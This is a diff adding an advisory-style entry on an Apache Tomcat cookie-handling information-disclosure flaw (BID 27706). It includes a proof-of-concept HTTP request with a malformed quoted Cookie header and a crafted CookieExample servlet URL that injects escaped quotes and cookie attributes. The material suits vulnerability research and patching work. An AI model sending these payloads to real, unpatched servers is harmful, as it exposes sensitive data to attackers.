@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/27706/info
+
+Apache Tomcat is prone to an information-disclosure vulnerability because it fails to adequately sanitize user-supplied data.
+
+Attackers can exploit this issue to access potentially sensitive data that may aid in further attacks.
+
+Versions prior to Apache Tomcat 6.0.16 and 5.5.26 are vulnerable.
+
+NOTE: This vulnerability is caused by an incomplete fix for BID 25316 - Apache Tomcat Multiple Remote Information Disclosure Vulnerabilities (CVE-2007-3385).
+
++++
+GET /myapp/MyCookies HTTP/1.1
+Host: localhost
+Cookie: name="val " ue"
+Cookie: name1=moi
++++
+
+http://www.example.com/examples/servlets/servlet/CookieExample?cookiename=test&cookievalue=test%5c%5c%22%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%
+3B+Path%3D%2Fservlets-examples%2Fservlet+%3B 
